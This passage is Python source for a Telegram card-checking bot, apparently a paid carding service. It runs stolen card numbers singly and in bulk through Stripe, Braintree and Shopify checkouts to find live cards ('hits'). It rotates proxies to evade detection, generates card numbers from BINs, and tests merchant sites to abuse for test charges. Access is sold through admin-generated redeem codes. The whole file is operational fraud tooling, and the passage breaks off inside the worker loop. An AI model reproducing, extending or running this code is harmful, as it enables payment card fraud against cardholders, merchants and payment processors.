                    f"⏳ Duration: <b>{duration}</b>\n"
                    f"🔰 Type: <b>Shopify Access</b>\n\n"
                    f"🔑 Codes:\n{codes_text}\n\n"
                    f"💡 Users redeem with: <code>/redeem CODE</code>"
                )
                if len(msg_text) > 4000:
                    file_path = f"/tmp/shopify_codes_{duration}_{len(codes)}.txt"
                    with open(file_path, 'w') as f:
                        f.write(f"=== Shopify Redeem Codes ({duration}) ===\n")
                        f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                        f.write(f"Count: {len(codes)}\n\n")
                        for c in codes:
                            f.write(f"{c}\n")
                    await event.edit(
                        f"🎟️ Generated {len(codes)} Shopify codes ({duration}).",
                        parse_mode='html',
                        buttons=Button.inline("◀️ 𝗕𝗮𝗰𝗸 🔙", data="shopify_admin")
                    )
                    await self.bot_client.send_file(
                        event.chat_id, file_path,
                        caption=f"📎 {len(codes)} Shopify codes ({duration})",
                    )
                else:
                    await event.edit(
                        msg_text,
                        parse_mode='html',
                        buttons=Button.inline("◀️ 𝗕𝗮𝗰𝗸 🔙", data="shopify_admin")
                    )

            elif data == "shopify_list_users":
                if not self.shopify_users:
                    await event.edit(
                        "╔══════════════════════════════╗\n"
                        "║   👥 SHOPIFY USERS           ║\n"
                        "╚══════════════════════════════╝\n\n"
                        "<i>No users found</i>",
                        parse_mode='html',
                        buttons=Button.inline("◀️ 𝗕𝗮𝗰𝗸 🔙", data="shopify_admin")
                    )
                else:
                    lines = [
                        f"┃ <code>{uid}</code> → {exp.strftime('%Y-%m-%d %H:%M') if exp else '♾ Perm'}"
                        for uid, exp in self.shopify_users.items()
                    ]
                    await event.edit(
                        "╔══════════════════════════════╗\n"
                        "║   👥 SHOPIFY USERS           ║\n"
                        "╚══════════════════════════════╝\n\n"
                        f"┏━━━ Total: <code>{len(self.shopify_users)}</code> ━━━━━━━━━┓\n"
                        f"{chr(10).join(lines)}\n"
                        "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
                        parse_mode='html',
                        buttons=Button.inline("◀️ 𝗕𝗮𝗰𝗸 🔙", data="shopify_admin")
                    )

            elif data == "shopify_gencode":
                await event.edit(
                    "╔══════════════════════════════╗\n"
                    "║   🎟️ GEN SHOPIFY CODE        ║\n"
                    "╚══════════════════════════════╝\n\n"
                    "📤 <code>/shopify_gencode &lt;duration&gt;</code>\n\n"
                    "⏱ <code>30m</code> <code>1h</code> <code>1d</code> <code>1w</code> <code>1month</code> <code>perm</code>",
                    parse_mode='html',
                    buttons=Button.inline("◀️ 𝗕𝗮𝗰𝗸 🔙", data="shopify_admin")
                )

            elif data == "shopify_approve_prompt":
                await event.edit(
                    "╔══════════════════════════════╗\n"
                    "║   ✅ APPROVE SHOPIFY         ║\n"
                    "╚══════════════════════════════╝\n\n"
                    "📤 <code>/shopify_approve &lt;uid&gt; &lt;dur&gt;</code>",
                    parse_mode='html',
                    buttons=Button.inline("◀️ 𝗕𝗮𝗰𝗸 🔙", data="shopify_admin")
                )

            elif data == "shopify_revoke_prompt":
                await event.edit(
                    "╔══════════════════════════════╗\n"
                    "║   ❌ REVOKE SHOPIFY          ║\n"
                    "╚══════════════════════════════╝\n\n"
                    "📤 <code>/shopify_revoke &lt;uid&gt;</code>",
                    parse_mode='html',
                    buttons=Button.inline("◀️ 𝗕𝗮𝗰𝗸 🔙", data="shopify_admin")
                )

            elif data == "admin_broadcast":
                await event.edit(
                    "╔══════════════════════════════╗\n"
                    "║   📢 BROADCAST               ║\n"
                    "╚══════════════════════════════╝\n\n"
                    "📤 <code>/broadcast &lt;message&gt;</code>",
                    parse_mode='html',
                    buttons=Button.inline("◀️ 𝗕𝗮𝗰𝗸 🔙", data="admin")
                )

            elif data == "admin_users":
                if not self.users:
                    await event.edit(
                        "╔══════════════════════════════╗\n"
                        "║   👥 GLOBAL USERS            ║\n"
                        "╚══════════════════════════════╝\n\n"
                        "<i>No users found</i>",
                        parse_mode='html',
                        buttons=Button.inline("◀️ 𝗕𝗮𝗰𝗸 🔙", data="admin")
                    )
                else:
                    lines = [
                        f"┃ <code>{uid}</code> → {exp.strftime('%Y-%m-%d %H:%M') if exp else '♾ Perm'}"
                        for uid, exp in self.users.items()
                    ]
                    await event.edit(
                        "╔══════════════════════════════╗\n"
                        "║   👥 GLOBAL USERS            ║\n"
                        "╚══════════════════════════════╝\n\n"
                        f"┏━━━ Total: <code>{len(self.users)}</code> ━━━━━━━━━━┓\n"
                        f"{chr(10).join(lines)}\n"
                        "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
                        parse_mode='html',
                        buttons=Button.inline("◀️ 𝗕𝗮𝗰𝗸 🔙", data="admin")
                    )

            elif data == "admin_stats":
                tc = self.stats['total_checked']
                ta = self.stats['total_approved']
                tch = self.stats['total_charged']
                r = (ta / tc * 100) if tc else 0
                await event.edit(
                    "╔══════════════════════════════╗\n"
                    "║   📊 BOT STATISTICS          ║\n"
                    "╚══════════════════════════════╝\n\n"
                    "┏━━━━━ 📈 Data ━━━━━━━━━━━━━┓\n"
                    f"┃ 🔍 Checked:  <code>{tc:,}</code>\n"
                    f"┃ ✅ Approved: <code>{ta:,}</code>\n"
                    f"┃ 💰 Charged:  <code>{tch:,}</code>\n"
                    f"┃ 📈 Rate:     <code>{r:.1f}%</code>\n"
                    f"┃ 🕒 Uptime:   <code>{self.get_uptime()}</code>\n"
                    "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
                    parse_mode='html', buttons=Button.inline("◀️ 𝗕𝗮𝗰𝗸 🔙", data="admin")
                )

            elif data == "admin_gencode":
                await event.edit(
                    "╔══════════════════════════════╗\n"
                    "║   🎟️ GEN GLOBAL CODE         ║\n"
                    "╚══════════════════════════════╝\n\n"
                    "📤 <code>/gencode &lt;duration&gt;</code>\n\n"
                    "⏱ <code>30m</code> <code>1h</code> <code>1d</code> <code>1w</code> <code>1month</code> <code>perm</code>",
                    parse_mode='html',
                    buttons=Button.inline("◀️ 𝗕𝗮𝗰𝗸 🔙", data="admin")
                )

            elif data == "back_main":
                if not self.has_any_access(uid):
                    btns = [[Button.inline("🎟️ 𝗥𝗲𝗱𝗲𝗲𝗺 𝗖𝗼𝗱𝗲 🔑", data="redeem_menu")]]
                    await event.edit(
                        "╔══════════════════════════════╗\n"
                        "║     🔒 ACCESS REQUIRED       ║\n"
                        "╚══════════════════════════════╝\n\n"
                        "📩 Contact @Unknownentit7\n"
                        "🎟️ Or redeem a code below",
                        buttons=btns, parse_mode='html'
                    )
                    return
                tc = self.stats['total_checked']
                ta = self.stats['total_approved']
                sr = (ta / tc * 100) if tc else 0.0
                speed = 1 / DELAY_BETWEEN_CHECKS
                speed_str = f"{speed:.1f}" if speed < 10 else f"{int(speed)}"
                header = (
                    "╔══════════════════════════════════════╗\n"
                    "║  👑 𝗦𝗔𝗩𝗔𝗚𝗘  𝗧𝗘𝗥𝗠𝗜𝗡𝗔𝗟 🔥            ║\n"
                    "╠══════════════════════════════════════╣\n\n"
                    "┏━━━━━ 🖥 System ━━━━━━━━━━┓\n"
                    "┃ 🟢 Status:  <code>ONLINE 🔥</code>\n"
                    f"┃ 🧠 Engine:  <code>ACTIVE ⚡</code>\n"
                    f"┃ 💨 Speed:   <code>{speed_str} cards/sec</code>\n"
                    f"┃ 🕒 Uptime:  <code>{self.get_uptime()}</code>\n"
                    "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
                    "┏━━━━━ 📊 Kill Stats ━━━━━━━┓\n"
                    f"┃ 🔍 Checked:  <code>{tc:,}</code>\n"
                    f"┃ 💀 Hits:     <code>{ta:,}</code>\n"
                    f"┃ 📈 Rate:     <code>{sr:.1f}%</code>\n"
                    "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
                    "┏━━━━━ 📃 Limits ━━━━━━━━━━┓\n"
                    f"┃ ⚡ Stripe:    <code>{MAX_CARDS_PER_FILE_STRIPE:,}</code>\n"
                    f"┃ 🌐 Braintree: <code>{MAX_CARDS_PER_FILE_BRAINTREE:,}</code>\n"
                    f"┃ 🛒 Shopify:   <code>{MAX_CARDS_PER_FILE_SHOPIFY:,}</code>\n"
                    "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
                    "👇 <b>ᴘɪᴄᴋ ʏᴏᴜʀ ᴡᴇᴀᴘᴏɴ 💀</b>"
                )
                btns = []
                if self.is_user_approved(uid):
                    btns.extend([
                        [Button.inline("⚡ 𝗦𝘁𝗿𝗶𝗽𝗲 🗡️", data="mode_single"),
                         Button.inline("🌐 𝗕𝗿𝗮𝗶𝗻𝘁𝗿𝗲𝗲 💉", data="mode_bt_single")],
                        [Button.inline("📃 𝗦𝘁𝗿𝗶𝗽𝗲 𝗠𝗮𝘀𝘀 🔥", data="mode_mass"),
                         Button.inline("📃 𝗕𝗧 𝗠𝗮𝘀𝘀 💣", data="mode_bt_mass")],
                    ])
                if self.is_shopify_approved(uid):
                    btns.append([Button.inline("🛒 𝗦𝗵𝗼𝗽𝗶𝗳𝘆 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ☠️", data="shopify_menu")])
                btns.extend([
                    [Button.inline("👤 𝗔𝗰𝗰𝗼𝘂𝗻𝘁 💎", data="account"),
                     Button.inline("ℹ️ 𝗛𝗲𝗹𝗽 📖", data="help_menu")],
                    [Button.inline("🔍 𝗕𝗜𝗡 🧬", data="bin_search"),
                     Button.inline("🎴 𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗼𝗿 🎲", data="card_gen")],
                ])
                if uid in ADMINS:
                    btns.append([Button.inline("⚙️ 𝗔𝗱𝗺𝗶𝗻 𝗣𝗮𝗻𝗲𝗹 👑", data="admin")])
                await event.edit(header, buttons=btns, parse_mode='html')

        # ━━━━━━ TEXT COMMANDS ━━━━━━
        @self.bot_client.on(events.NewMessage(pattern=r'/myaccount'))
        async def myaccount_cmd(event):
            if not self.has_any_access(event.sender_id):
                return
            await self.show_user_dashboard(event.sender_id, event.chat_id)

        @self.bot_client.on(events.NewMessage(pattern=r'/bin (\d+)'))
        async def bin_cmd(event):
            if not self.has_any_access(event.sender_id):
                return
            await self.bin_search(event.chat_id, event.pattern_match.group(1))

        @self.bot_client.on(events.NewMessage(pattern=r'/generate (\d+)(?: (\d+))?'))
        async def generate_cmd(event):
            uid = event.sender_id
            if not self.has_any_access(uid):
                return
            count = int(event.pattern_match.group(1))
            bin_input = event.pattern_match.group(2) if event.pattern_match.group(2) else None
            if count > MAX_CARDS_PER_FILE_STRIPE:
                await event.reply(f"❌ Max <code>{MAX_CARDS_PER_FILE_STRIPE:,}</code>", parse_mode='html')
                return
            cards = self.generate_cards(count, bin_input)
            filepath = os.path.join(STORAGE_DIR, f"gen_{uid}_{uuid.uuid4().hex}.txt")
            with open(filepath, "w") as f:
                f.write("\n".join(cards))
            await self.bot_client.send_file(event.chat_id, filepath,
                                            caption=f"🎴 Generated <code>{len(cards):,}</code> cards",
                                            parse_mode='html')
            os.remove(filepath)

        @self.bot_client.on(events.NewMessage(pattern=r'/redeem (.+)'))
        async def redeem_cmd(event):
            uid = event.sender_id
            code = event.pattern_match.group(1).strip()
            success, typ = await self.redeem_code(uid, code)
            if not success:
                await event.reply(
                    "╔══════════════════════════════╗\n"
                    "║      ❌ INVALID CODE          ║\n"
                    "╚══════════════════════════════╝\n\n"
                    f"Code <code>{code}</code> not found or expired.",
                    parse_mode='html'
                )

        @self.bot_client.on(events.NewMessage(pattern=r'/gencode (.+)'))
        async def gencode_cmd(event):
            if event.sender_id not in ADMINS:
                return
            code = self.generate_redeem_code(event.pattern_match.group(1).strip())
            if code:
                await event.reply(
                    "╔══════════════════════════════╗\n"
                    "║   🎟️ CODE GENERATED          ║\n"
                    "╚══════════════════════════════╝\n\n"
                    f"🔑 Code: <code>{code}</code>\n"
                    "🔰 Type: <code>Global Access</code>",
                    parse_mode='html'
                )

        @self.bot_client.on(events.NewMessage(pattern=r'/shopify_gencode (.+)'))
        async def shopify_gencode_cmd(event):
            if event.sender_id not in ADMINS:
                return
            code = self.generate_shopify_redeem_code(event.pattern_match.group(1).strip())
            if code:
                await event.reply(
                    "╔══════════════════════════════╗\n"
                    "║   🎟️ CODE GENERATED          ║\n"
                    "╚══════════════════════════════╝\n\n"
                    f"🔑 Code: <code>{code}</code>\n"
                    "🔰 Type: <code>Shopify Access</code>",
                    parse_mode='html'
                )

        # ━━━━━━ /shopify_mass_gencode — Mass Generate Shopify Redeem Codes ━━━━━━
        @self.bot_client.on(events.NewMessage(pattern=r'/shopify_mass_gencode\s+(\d+)\s+(.+)'))
        async def shopify_mass_gencode_cmd(event):
            if event.sender_id not in ADMINS:
                return
            count = int(event.pattern_match.group(1))
            duration = event.pattern_match.group(2).strip()
            if count < 1 or count > 50:
                await event.reply("❌ Count must be between 1 and 50.", parse_mode='html')
                return
            valid_durations = ["1m", "1h", "1d", "1w", "1month", "perm"]
            if duration.lower() not in valid_durations:
                await event.reply(
                    "❌ Invalid duration. Use one of:\n"
                    f"<code>{', '.join(valid_durations)}</code>",
                    parse_mode='html'
                )
                return
            codes = []
            for _ in range(count):
                code = self.generate_shopify_redeem_code(duration)
                if code:
                    codes.append(code)
            if not codes:
                await event.reply("❌ Failed to generate codes.", parse_mode='html')
                return
            # Format the codes list
            dur_display = duration.lower()
            codes_text = "\n".join(f"<code>{c}</code>" for c in codes)
            msg = (
                "╔══════════════════════════════════╗\n"
                "║  🎟️ MASS CODES GENERATED         ║\n"
                "╚══════════════════════════════════╝\n\n"
                f"📊 Count: <b>{len(codes)}</b>\n"
                f"⏳ Duration: <b>{dur_display}</b>\n"
                f"🔰 Type: <b>Shopify Access</b>\n\n"
                f"🔑 Codes:\n{codes_text}\n\n"
                f"💡 Users redeem with: <code>/redeem CODE</code>"
            )
            # If message is too long, send as file
            if len(msg) > 4000:
                file_path = f"/tmp/shopify_codes_{dur_display}_{len(codes)}.txt"
                with open(file_path, 'w') as f:
                    f.write(f"=== Shopify Redeem Codes ({dur_display}) ===\n")
                    f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                    f.write(f"Count: {len(codes)}\n\n")
                    for c in codes:
                        f.write(f"{c}\n")
                await event.reply(
                    f"🎟️ Generated {len(codes)} Shopify codes ({dur_display}).\n"
                    "📎 Codes attached as file:",
                    file=file_path,
                    parse_mode='html'
                )
            else:
                await event.reply(msg, parse_mode='html')

        @self.bot_client.on(events.NewMessage(pattern=r'/approve (\d+) (.+)'))
        async def approve_cmd(event):
            if event.sender_id not in ADMINS:
                return
            target, dur = int(event.pattern_match.group(1)), event.pattern_match.group(2).strip()
            ok, msg = await self.approve_user(target, dur)
            await event.reply(msg)

        @self.bot_client.on(events.NewMessage(pattern=r'/shopify_approve (\d+) (.+)'))
        async def shopify_approve_cmd(event):
            if event.sender_id not in ADMINS:
                return
            target, dur = int(event.pattern_match.group(1)), event.pattern_match.group(2).strip()
            ok, msg = await self.approve_shopify_user(target, dur)
            await event.reply(msg)

        @self.bot_client.on(events.NewMessage(pattern=r'/shopify_revoke (\d+)'))
        async def shopify_revoke_cmd(event):
            if event.sender_id not in ADMINS:
                return
            target = int(event.pattern_match.group(1))
            if target in self.shopify_users:
                del self.shopify_users[target]
                self.save_users()
                await event.reply(
                    "╔══════════════════════════════╗\n"
                    "║   ❌ ACCESS REVOKED           ║\n"
                    "╚══════════════════════════════╝\n\n"
                    f"🔒 User <code>{target}</code> Shopify removed",
                    parse_mode='html'
                )
            else:
                await event.reply(f"❌ User <code>{target}</code> not found", parse_mode='html')

        # ━━━━━━ /test_sites — API-based site validator (admin only) ━━━━━━
        @self.bot_client.on(events.NewMessage(pattern=r'/test_sites'))
        async def test_sites_cmd(event):
            if event.sender_id not in ADMINS:
                return
            sites = list(self.owner_sites) if self.owner_sites else []
            if not sites:
                await event.reply("❌ No sites loaded. Upload sites first.")
                return
            status_msg = await event.reply(
                f"🔍 Testing {len(sites)} sites via Flask API...\n"
                f"⏳ This may take a while ({SHOPIFY_TEST_SITE_TIMEOUT}s timeout per site, retry enabled).\n"
                f"📋 Strict mode: site must return real payment response (CARD_DECLINED etc.).",
                parse_mode='html'
            )
            try:
                working, dead = await self.test_sites_graphql(sites)
                # Auto-load working sites
                loaded = self.load_working_sites_from_file()
                fallback_msg = ""
                if loaded == 0 and self.owner_sites:
                    self.working_sites = list(self.owner_sites)
                    self.site_index = 0
                    self.dead_sites = set()
                    loaded = len(self.working_sites)
                    fallback_msg = "\n⚠️ No tested sites passed — using ALL owner sites as fallback."
                await status_msg.edit(
                    "╔══════════════════════════════╗\n"
                    "║   🔍 SITE TEST COMPLETE       ║\n"
                    "╚══════════════════════════════╝\n\n"
                    f"✅ Working: <code>{len(working)}</code> (strict: real payment response verified)\n"
                    f"❌ Dead: <code>{len(dead)}</code>\n"
                    f"📦 Loaded: <code>{loaded}</code> sites activated\n\n"
                    f"📝 Saved to <code>working_sites_api.txt</code>{fallback_msg}\n"
                    "📋 Check bot logs for per-site failure details.",
                    parse_mode='html'
                )
            except Exception as e:
                await status_msg.edit(f"❌ Error testing sites: <code>{str(e)[:100]}</code>", parse_mode='html')

        # ━━━━━━ /load_working_sites — Load tested working sites (admin only) ━━━━━━
        @self.bot_client.on(events.NewMessage(pattern=r'/load_working_sites'))
        async def load_working_sites_cmd(event):
            if event.sender_id not in ADMINS:
                return
            count = self.load_working_sites_from_file()
            if count > 0:
                await event.reply(
                    f"✅ Loaded <code>{count}</code> working sites\n"
                    "🔄 Active site list replaced.",
                    parse_mode='html'
                )
            else:
                await event.reply(
                    "❌ No working sites file found or file is empty.\n"
                    "Run <code>/test_sites</code> first.",
                    parse_mode='html'
                )

        # ━━━━━━ FIX: SINGLE CHECKS — no wait_for wrapper, use async rotation ━━━━━━
        @self.bot_client.on(events.NewMessage(pattern=r'^/st(?:\s+(.+))?\s*$'))
        async def single_stripe(event):
            uid = event.sender_id
            if not self.is_user_approved(uid):
                await event.reply("🔒 Access Denied.")
                return
            args = (event.pattern_match.group(1) or "").strip()
            if not args:
                await event.reply("❌ <code>/st CC|MM|YY|CVV</code>", parse_mode='html')
                return
            status = await event.reply("💀 <code>ʜᴜɴᴛɪɴɢ ᴠɪᴀ Stripe...</code> ⚡", parse_mode='html')
            raw = await self.send_card_to_payu(args, gateway='stripe')
            self.stats["total_checked"] += 1
            self.update_user_stats(uid, checked=1)
            if self.is_approved(raw):
                self.stats["total_approved"] += 1
                self.update_user_stats(uid, approved=1)
                fmt = await self.format_stripe_approved(args, raw)
                await self.glowing_success(status, fmt)
            else:
                parts = args.split('|')
                await status.edit(
                    "╔══════════════════════════════════════╗\n"
                    "║  ❌ 𝗦𝗧𝗥𝗜𝗣𝗘 ─ 𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 💀            ║\n"
                    "╚══════════════════════════════╝\n\n"
                    f"┃ 💳 <code>{args}</code>\n"
                    f"┃ 🔢 BIN: <code>{parts[0][:6]}</code>\n"
                    f"┃ 🚫 <code>{raw[:80]}</code>\n"
                    f"┃ ⏰ <code>{datetime.now().strftime('%H:%M:%S')}</code>\n\n"
                    "🔴 <b>Status:</b> <code>DECLINED</code> ❌ — ᴅᴇᴀᴅ ᴄᴀʀᴅ 💀",
                    parse_mode='html'
                )

        @self.bot_client.on(events.NewMessage(pattern=r'^/bt(?:\s+(.+))?\s*$'))
        async def single_bt(event):
            uid = event.sender_id
            if not self.is_user_approved(uid):
                await event.reply("🔒 Access Denied.")
                return
            args = (event.pattern_match.group(1) or "").strip()
            if not args:
                await event.reply("❌ <code>/bt CC|MM|YY|CVV</code>", parse_mode='html')
                return
            status = await event.reply("💀 <code>ʜᴜɴᴛɪɴɢ ᴠɪᴀ Braintree...</code> 🌐", parse_mode='html')
            raw = await self.send_card_to_payu(args, gateway='braintree')
            self.stats["total_checked"] += 1
            self.update_user_stats(uid, checked=1)
            if self.is_approved(raw):
                self.stats["total_approved"] += 1
                self.update_user_stats(uid, approved=1)
                fmt = await self.format_braintree_auth(args, raw)
                await self.glowing_success(status, fmt)
            else:
                parts = args.split('|')
                await status.edit(
                    "╔══════════════════════════════════════╗\n"
                    "║  ❌ 𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 ─ 𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 💀        ║\n"
                    "╚══════════════════════════════╝\n\n"
                    f"┃ 💳 <code>{args}</code>\n"
                    f"┃ 🔢 BIN: <code>{parts[0][:6]}</code>\n"
                    f"┃ 🚫 <code>{raw[:80]}</code>\n"
                    f"┃ ⏰ <code>{datetime.now().strftime('%H:%M:%S')}</code>\n\n"
                    "🔴 <b>Status:</b> <code>DECLINED</code> ❌ — ᴅᴇᴀᴅ ᴄᴀʀᴅ 💀",
                    parse_mode='html'
                )

        # ━━━━━━ /sp — Shopify Reloaded V2 Direct Checkout ━━━━━━
        @self.bot_client.on(events.NewMessage(pattern=r'/sp(?: |$)(.*)'))
        async def single_shopify(event):
            uid = event.sender_id
            if not self.is_shopify_approved(uid):
                await event.reply("🔒 Shopify Access Denied.")
                return
            args = event.pattern_match.group(1).strip()
            if not args:
                await event.reply("❌ <code>/sp CC|MM|YY|CVV</code> or <code>/sp CC|MM|YY|CVV proxy</code> or <code>/sp CC|MM|YY|CVV low</code>", parse_mode='html')
                return
            parts = args.split()
            card = parts[0]
            if not re.match(r"^\d{13,19}\|\d{2}\|\d{2,4}\|\d{3,4}$", card):
                await event.reply("❌ Invalid format. <code>CC|MM|YY|CVV</code>", parse_mode='html')
                return

            mode = "direct"
            amount_filter = None  # None means "not explicitly provided"
            for p in parts[1:]:
                pl = p.lower()
                if pl == "proxy":
                    mode = "proxy"
                elif pl in ("low", "medium", "high", "all"):
                    amount_filter = pl

            # If user didn't specify a filter explicitly, use their stored preference
            if amount_filter is None:
                amount_filter = self.user_amount_filter.get(uid, "all")

            status = await event.reply(
                "💀 <code>⟦ ꜱʜᴏᴘɪꜰʏ ʀᴇʟᴏᴀᴅᴇᴅ V2 ᴇɴɢɪɴᴇ ꜰɪʀɪɴɢ ᴜᴘ... ⟧</code> ☠️",
                parse_mode='html'
            )
            approved = False
            final_info = {"reason": "No response"}
            used_proxy = None

            try:
                if mode == "direct":
                    raw, approved, final_info = await self.shopify_check_card(
                        card, proxy_str=None, user_id=uid, amount_filter=amount_filter
                    )
                else:
                    proxies = self.user_proxies.get(uid, [])
                    if not proxies:
                        await status.edit("❌ No proxies. Upload first!", parse_mode='html')
                        return
                    proxy = await self.get_next_proxy_async(uid)
                    raw, approved, final_info = await self.shopify_check_card(
                        card, proxy_str=proxy, user_id=uid, amount_filter=amount_filter
                    )
                    used_proxy = proxy
            except Exception as e:
                final_info = {"reason": f"Error: {str(e)}"}

            if not final_info.get("reason"):
                final_info["reason"] = "No response"

            self.stats["total_checked"] += 1
            self.update_user_stats(uid, checked=1)
            if approved:
                self.stats["total_approved"] += 1
                self.update_user_stats(uid, approved=1)

            fmt = await self.format_shopify_result(card, approved, final_info, used_proxy)
            await status.edit(fmt, parse_mode='html')

        # ━━━━━━ MASS FILE HANDLER ━━━━━━
        @self.bot_client.on(events.NewMessage(func=lambda e: e.message.document))
        async def file_handler(event):
            uid = event.sender_id
            mode = self.user_upload_mode.get(uid)
            if mode is None:
                return
            self.user_upload_mode.pop(uid, None)

            doc = event.message.document
            try:
                content = await self.bot_client.download_file(doc, bytes)
            except Exception as e:
                await event.reply(f"❌ Download failed: {e}")
                return

            if mode == 'shopify_proxies':
                if not self.is_shopify_approved(uid) and uid not in ADMINS:
                    await event.reply("🔒 Shopify access required.")
                    return
                proxies = [l.strip() for l in content.decode(errors='ignore').splitlines() if l.strip()]
                if not proxies:
                    await event.reply("❌ No proxies in file.")
                    return
                msg = await event.reply("⏳ <code>Validating proxies...</code>", parse_mode='html')
                valid = await self.validate_proxies_batch(proxies, user_id=uid)
                self.user_proxies[uid] = valid
                self.proxy_index[uid] = 0
                await msg.edit(
                    "╔══════════════════════════════╗\n"
                    "║   📎 PROXIES LOADED          ║\n"
                    "╚══════════════════════════════╝\n\n"
                    f"┃ 🟢 Working: <code>{len(valid)}</code>\n"
                    f"┃ 🔴 Dead:    <code>{len(proxies) - len(valid)}</code>\n"
                    f"┃ 📊 Total:   <code>{len(valid)}</code>",
                    parse_mode='html'
                )
                return

            if mode == 'owner_sites':
                if uid not in ADMINS:
                    await event.reply("🔒 Admin only.")
                    return
                sites = [l.strip() for l in content.decode(errors='ignore').splitlines()
                         if l.strip() and not l.startswith("#")]
                if not sites:
                    await event.reply("❌ No valid sites.")
                    return
                original_count = len(sites)
                self.save_owner_sites(sites)  # internally caps at MAX_OWNER_SITES
                capped = len(self.owner_sites)
                cap_note = f"\n┃ ⚠️ <b>Capped to:</b> <code>{MAX_OWNER_SITES}</code> (was {original_count})" if original_count > MAX_OWNER_SITES else ""
                # Trust all sites as working — no validation
                self.working_sites = list(self.owner_sites)
                self.dead_sites = set()
                self._sites_ready = True
                await event.reply(
                    "╔══════════════════════════════════════╗\n"
                    "║  📂 𝗦𝗜𝗧𝗘𝗦 𝗟𝗢𝗔𝗗𝗘𝗗 ⚡                 ║\n"
                    "╠══════════════════════════════════════╣\n\n"
                    f"┃ 📋 <b>Total:</b>     <code>{capped}</code>{cap_note}\n"
                    f"┃ 🟢 <b>Working:</b>   <code>{capped}</code> (all trusted ✅)\n"
                    f"┃ 🔴 <b>Dead:</b>      <code>0</code>\n\n"
                    "💎 <i>All sites loaded and ready to use</i>",
                    parse_mode='html'
                )
                return

            elif mode == 'shopify':
                if not self.is_shopify_approved(uid) and uid not in ADMINS:
                    await event.reply("🔒 Shopify access required.")
                    return
                max_cards, gateway, prefix = MAX_CARDS_PER_FILE_SHOPIFY, 'shopify', "🛒 Shopify"
            elif mode == 'stripe':
                if not self.is_user_approved(uid):
                    await event.reply("🔒 Access required.")
                    return
                max_cards, gateway, prefix = MAX_CARDS_PER_FILE_STRIPE, 'stripe', "⚡ Stripe"
            elif mode == 'braintree':
                if not self.is_user_approved(uid):
                    await event.reply("🔒 Access required.")
                    return
                max_cards, gateway, prefix = MAX_CARDS_PER_FILE_BRAINTREE, 'braintree', "🌐 Braintree"
            else:
                return

            if any(job['user_id'] == uid for job in self.active_jobs.values()):
                await event.reply("❌ You already have an active job.")
                return

            filepath = self.save_cards_file(content, uid, event.chat_id)
            valid, cnt, err = self.validate_cards_file(filepath, max_cards)
            if not valid:
                os.remove(filepath)
                await event.reply(f"❌ {err}")
                return

            # FIX: Validate price cache before starting a filtered Shopify mass job
            if gateway == 'shopify':
                user_filter = self.user_amount_filter.get(uid, "all")
                if user_filter != "all":
                    base_sites = list(self.good_sites) if self.good_sites else list(self.working_sites)
                    uncached = [s for s in base_sites if s not in self._site_price_cache]
                    if uncached:
                        os.remove(filepath)
                        await event.reply(
                            f"⚠️ <b>Price cache incomplete</b> — {len(uncached)}/{len(base_sites)} sites missing prices.\n\n"
                            "Run <code>/test_sites</code> first to populate site prices, then try again.\n"
                            "Or set filter to <b>🌐 All</b> to skip price filtering.",
                            parse_mode='html'
                        )
                        return

            job_id = str(uuid.uuid4())
            self.active_jobs[job_id] = {
                'filepath': filepath, 'user_id': uid, 'chat_id': event.chat_id,
                'total': cnt, 'processed': 0, 'stop': False, 'message_id': None,
                'approved_cards': [], 'charged_cards': [], 'gateway': gateway,
                'start_time': datetime.now(), 'declined_count': 0, 'id': job_id
            }
            speed = 1 / DELAY_BETWEEN_CHECKS
            speed_str = f"{speed:.1f}" if speed < 10 else f"{int(speed)}"
            msg = await event.reply(
                "╔══════════════════════════════╗\n"
                f"║   {prefix} MASS CHECK         ║\n"
                "╚══════════════════════════════╝\n\n"
                f"    {self.progress_bar(0, cnt)}\n\n"
                f"┃ 📃 Cards: <code>{cnt:,}</code>\n"
                f"┃ ⚡ Speed: <code>{speed_str} cards/sec</code>",
                buttons=Button.inline("⏹ 𝗦𝘁𝗼𝗽 𝗞𝗶𝗹𝗹 🛑", data=f"stop_{job_id}"),
                parse_mode='html'
            )
            self.active_jobs[job_id]['message_id'] = msg.id
            await self.task_queue.put(self.active_jobs[job_id])

        logger.info("✅ Bot started and listening...")
        await self.bot_client.run_until_disconnected()

    # ═══════════════ FIX: Worker Loop — async proxy rotation ═══════════════
    async def worker_loop(self, wid: int):
        logger.info(f"Worker {wid} started")
        while True:
            job = None
            job_id = None
            chat_id = None
            got_job = False
            try:
                job = await self.task_queue.get()
                got_job = True
                job_id = job['id']
                filepath = job['filepath']
                chat_id = job['chat_id']
                user_id = job['user_id']
                gateway = job['gateway']

                if gateway in ['stripe', 'braintree'] and not self.is_user_approved(user_id):
                    await self.safe_send_message(chat_id, "🔒 No access. Job cancelled.")
                    self.active_jobs.pop(job_id, None)
                    continue

                if gateway == 'shopify' and not self.is_shopify_approved(user_id):
                    await self.safe_send_message(chat_id, "🔒 No Shopify access. Job cancelled.")
                    self.active_jobs.pop(job_id, None)
                    continue

                with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                    cards = [line.strip() for line in f if '|' in line.strip()]

                total = len(cards)
                if total == 0:
                    await self.safe_send_message(chat_id, "❌ No valid cards found.")
                    self.active_jobs.pop(job_id, None)
                    continue

                approved_cards = []
                charged_cards = []
                declined_count = 0
                start_time = datetime.now()

                msg = await self.safe_send_message(
                    chat_id,
                    f"⏳ <code>Starting {gateway.upper()} mass check... ({total:,} cards)</code>",
                )
                job['message_id'] = msg.id
                no_progress_deadline = time.time() + JOB_NO_PROGRESS_TIMEOUT

                for idx, card in enumerate(cards, 1):
                    if time.time() > no_progress_deadline:
                        await self.safe_send_message(
                            chat_id,
